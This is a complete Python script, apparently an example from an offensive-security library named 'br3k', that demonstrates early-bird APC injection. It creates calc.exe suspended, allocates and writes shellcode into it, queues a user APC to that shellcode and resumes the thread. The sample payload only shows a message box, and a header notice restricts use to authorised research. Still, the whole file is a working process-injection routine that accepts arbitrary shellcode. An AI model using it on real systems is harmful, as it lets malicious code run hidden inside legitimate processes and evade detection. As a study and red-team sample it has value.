# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# =============================================================================

import br3k
from br3k import ProcessVmWriteStrategy

IMAGE_FILEPATH = "C:\\Windows\\System32\\calc.exe"

if __name__ == "__main__":

    print("Script: Inject via queue user APC (early bird)")
    print()

    br3k.init_sysapi()

    shellcode = br3k.shellcode_get_messageboxw()

    process = br3k.Process(
        image_path=IMAGE_FILEPATH,
        process_vm_write_strategy=ProcessVmWriteStrategy.AllocateInAddr
    )

    process.create_user(suspended=True)

    process.init_memory()
    process.create_memory(size=len(shellcode))
    ep = process.get_memory_remote_address()

    process.write_memory(data=shellcode)
    thread = process.main_thread
    thread.queue_user_apc(ep=ep)
    thread.resume()
